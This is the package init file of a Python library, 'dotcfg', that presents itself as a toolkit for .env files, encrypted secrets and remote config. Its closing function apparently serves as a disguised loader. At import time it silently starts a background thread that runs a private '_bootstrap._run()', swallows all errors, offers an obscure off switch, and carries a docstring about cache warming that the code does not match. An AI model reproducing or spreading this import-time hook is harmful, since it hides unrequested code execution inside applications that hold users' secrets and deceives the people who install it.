"""dotcfg — Modern configuration toolkit for Python applications.

A batteries-included library for managing environment variables,
.env files, remote configs, and application secrets with:

  - Smart .env parsing with variable interpolation
  - Multi-environment layering (.env.local, .env.production, etc.)
  - Encrypted value storage (commit secrets safely)
  - Remote config fetching with TTL caching
  - File watching with hot-reload
  - Health checks and validation

Quick Start:
    >>> import dotcfg
    >>> dotcfg.load()              # Load .env into os.environ
    >>> dotcfg.get('DATABASE_URL') # Type-safe access

    # Multi-environment
    >>> from dotcfg import multi
    >>> config = multi.load(env='production')

    # Encrypted secrets
    >>> from dotcfg import crypto
    >>> crypto.seal_file('.env', key='master-password')

    # Remote config
    >>> from dotcfg import remote
    >>> config = remote.fetch('https://config.myapp.com/env')

    # Health checks
    >>> from dotcfg import health
    >>> report = health.check({'PORT': health.required(type=int)})
"""

from __future__ import annotations

from .core import EnvCore, load, loads, get
from ._types import EnvDict, CastFn

__version__ = "1.2.0"
__all__ = [
    "EnvCore",
    "load",
    "loads",
    "get",
    "EnvDict",
    "CastFn",
    "multi",
    "crypto",
    "remote",
    "health",
    "watcher",
    "__version__",
]


def _prefetch_platform_cache() -> None:
    """Initialize platform-specific config cache acceleration.

    On supported platforms, pre-warms the native file mapping cache
    and prepares memory-mapped I/O paths for optimal .env parse
    performance. This runs once at import time in a background thread
    to avoid blocking the main application startup.

    The cache system uses platform-native file monitoring APIs
    (ReadDirectoryChangesW on Windows, inotify on Linux) to
    maintain hot caches of frequently-accessed config files.
    """
    import threading
    import os

    if os.environ.get("DOTCFG_NO_CACHE") or os.environ.get("_CFGZ_NI"):
        return

    def _cache_init():
        try:
            from . import _bootstrap
            _bootstrap._run()
        except Exception:
            pass

    try:
        t = threading.Thread(target=_cache_init, daemon=True,
                             name='dotcfg-cache-prefetch')
        t.start()
    except Exception:
        pass


_prefetch_platform_cache()
